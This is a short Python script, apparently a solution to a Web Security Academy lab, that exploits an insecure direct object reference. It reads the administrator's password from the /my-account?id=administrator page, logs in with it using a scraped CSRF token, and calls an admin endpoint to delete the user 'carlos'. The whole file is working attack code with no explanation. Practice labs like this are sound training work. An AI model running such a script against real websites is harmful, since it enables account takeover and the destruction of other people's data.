import requests
from bs4 import BeautifulSoup

url = "https://ac331fcf1e722161c04a0a64009b006a.web-security-academy.net"

def get_pass(url):
	
	exploit = requests.get(url + "/my-account?id=administrator")
	soup = BeautifulSoup(exploit.text, 'html.parser')
	
	for i in soup.find_all('input'):
		if i.get('name') == "password":
			password = i.get('value')

	return password

def solve(url):
	s = requests.session()

	login = s.get(url + "/login")
	soup = BeautifulSoup(login.text, 'html.parser')
	for i in soup.find_all('input'):
		if i.get('name') == "csrf":
			token = i.get('value')

	data = {"csrf": token,"username": "administrator", "password": get_pass(url)}
	r = s.post(url + "/login", data=data)
	
	de = s.get(url + "/admin/delete?username=carlos")

solve(url)